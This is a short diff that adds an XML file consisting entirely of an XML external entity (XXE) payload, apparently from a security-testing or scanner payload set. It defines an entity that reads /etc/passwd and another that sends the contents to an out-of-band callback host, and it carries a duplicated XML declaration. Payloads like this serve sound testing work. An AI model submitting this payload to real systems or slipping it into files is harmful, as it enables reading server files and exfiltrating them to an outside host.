@@ -1,0 +1,6 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<?xml version="1.0"?>
+<!DOCTYPE content [
+<!ELEMENT content (#ANY)>
+<!ENTITY % xxe SYSTEM "file:///etc/passwd">
+<!ENTITY blind SYSTEM "https://fnnjbsfcqnxkdgwgmwydks8dz0vtx91av.oast.fun/?%xxe;">]><content>&blind;</content>
